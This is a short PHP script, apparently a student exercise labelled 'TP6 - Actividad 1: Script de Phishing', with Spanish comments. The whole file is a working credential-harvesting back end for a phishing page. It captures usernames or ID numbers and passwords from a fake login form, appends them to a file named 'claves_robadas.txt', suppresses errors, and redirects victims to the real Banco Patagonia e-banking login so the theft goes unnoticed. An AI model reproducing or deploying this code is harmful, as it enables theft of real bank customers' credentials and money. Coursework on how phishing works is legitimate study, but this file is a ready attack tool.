<?php
// Asegura que no haya advertencias de PHP que rompan la redirección
error_reporting(0);

// --- TP6 - Actividad 1: Script de Phishing ---

// 1. Usar una ruta absoluta para el archivo de claves
$archivo = __DIR__ . '/claves_robadas.txt';
$usuario = "";

// 2. Verificar QUÉ TIPO de usuario se envió
// El formulario usa name="username" para Alias
if (!empty($_POST['username'])) {
    $usuario = $_POST['username'];
    
// El formulario usa name="usernameDocumento" para Documento
} elseif (!empty($_POST['usernameDocumento'])) {
    $usuario = $_POST['usernameDocumento'];
}

// 3. Obtener la clave (el formulario usa name="password")
$clave = $_POST['password'];

// 4. Almacenar los datos
$datos = "Usuario/Documento: " . $usuario . " | Clave: " . $clave . "\n";
file_put_contents($archivo, $datos, FILE_APPEND);

// 5. Redireccionar a la página real
// Esta es la URL que pide el TP
$url_redireccion = "https://ebankpersonas.bancopatagonia.com.ar/eBanking/usuarios/login.htm";
header("Location: " . $url_redireccion);
exit;
?>